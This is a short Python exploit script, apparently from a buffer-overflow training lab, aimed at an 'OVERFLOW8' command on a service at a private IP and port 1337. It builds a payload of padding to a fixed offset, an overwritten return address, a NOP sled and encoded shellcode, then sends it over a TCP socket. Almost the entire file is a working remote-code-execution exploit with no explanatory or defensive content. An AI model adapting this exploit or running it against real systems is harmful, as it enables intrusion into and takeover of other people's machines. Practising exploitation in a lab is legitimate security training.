#!/usr/bin/env python3

import socket, sys


'''
Getting offset 
'''


ip = "10.10.42.175"
port = 1337

prefix = b"OVERFLOW8 "
offset = 1786
overflow = b"A" * offset
retn = b"\xeb\x11\x50\x62"
padding = b"\x90"*16      # used for giving some space to unpack encoding(in this case, shikataganai)


shellcode = b"\xdd\xc1\xd9\x74\x24\xf4\xbf\x6b\x91\xd2\x15\x5a\x2b\xc9\xb1\x52\x83\xc2\x04\x31\x7a\x13\x03\x11\x82\x30\xe0\x19\x4c\x36\x0b\xe1\x8d\x57\x85\x04\xbc\x57\xf1\x4d\xef\x67\x71\x03\x1c\x03\xd7\xb7\x97\x61\xf0\xb8\x10\xcf\x26\xf7\xa1\x7c\x1a\x96\x21\x7f\x4f\x78\x1b\xb0\x82\x79\x5c\xad\x6f\x2b\x35\xb9\xc2\xdb\x32\xf7\xde\x50\x08\x19\x67\x85\xd9\x18\x46\x18\x51\x43\x48\x9b\xb6\xff\xc1\x83\xdb\x3a\x9b\x38\x2f\xb0\x1a\xe8\x61\x39\xb0\xd5\x4d\xc8\xc8\x12\x69\x33\xbf\x6a\x89\xce\xb8\xa9\xf3\x14\x4c\x29\x53\xde\xf6\x95\x65\x33\x60\x5e\x69\xf8\xe6\x38\x6e\xff\x2b\x33\x8a\x74\xca\x93\x1a\xce\xe9\x37\x46\x94\x90\x6e\x22\x7b\xac\x70\x8d\x24\x08\xfb\x20\x30\x21\xa6\x2c\xf5\x08\x58\xad\x91\x1b\x2b\x9f\x3e\xb0\xa3\x93\xb7\x1e\x34\xd3\xed\xe7\xaa\x2a\x0e\x18\xe3\xe8\x5a\x48\x9b\xd9\xe2\x03\x5b\xe5\x36\x83\x0b\x49\xe9\x64\xfb\x29\x59\x0d\x11\xa6\x86\x2d\x1a\x6c\xaf\xc4\xe1\xe7\xda\x10\x99\x0a\xb2\x22\x59\xe4\x1f\xaa\xbf\x6c\xb0\xfa\x68\x19\x29\xa7\xe2\xb8\xb6\x7d\x8f\xfb\x3d\x72\x70\xb5\xb5\xff\x62\x22\x36\x4a\xd8\xe5\x49\x60\x74\x69\xdb\xef\x84\xe4\xc0\xa7\xd3\xa1\x37\xbe\xb1\x5f\x61\x68\xa7\x9d\xf7\x53\x63\x7a\xc4\x5a\x6a\x0f\x70\x79\x7c\xc9\x79\xc5\x28\x85\x2f\x93\x86\x63\x86\x55\x70\x3a\x75\x3c\x14\xbb\xb5\xff\x62\xc4\x93\x89\x8a\x75\x4a\xcc\xb5\xba\x1a\xd8\xce\xa6\xba\x27\x05\x63\xda\xc5\x8f\x9e\x73\x50\x5a\x23\x1e\x63\xb1\x60\x27\xe0\x33\x19\xdc\xf8\x36\x1c\x98\xbe\xab\x6c\xb1\x2a\xcb\xc3\xb2\x7e"


#postfix = b""

payload = prefix + overflow + retn + padding + shellcode     #Add NOPs \x90

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
    s.connect((ip,port))
    print("Sending payload...")
    #s.recv(1024)
    s.send(payload + b'\r\n')
    #s.recv(1024)
    print("Done!")
    s.close

except:
    print("Cannot connect to server")
    sys.exit()
